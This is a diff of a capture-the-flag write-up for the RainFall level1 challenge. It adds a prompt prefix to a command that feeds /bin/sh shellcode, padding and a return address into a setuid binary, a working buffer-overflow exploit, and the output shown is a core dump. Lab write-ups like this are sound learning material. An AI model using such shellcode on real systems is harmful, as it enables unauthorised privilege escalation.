@@ -154,7 +154,7 @@ level1
 
 - A shell has been successfully launched, let's take advantage of [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) by doing the same thing without GDB.
 ```
-(python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat) | ./level1
+level1@RainFall:~$ (python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat) | ./level1
 
 Illegal instruction (core dumped)
 ```
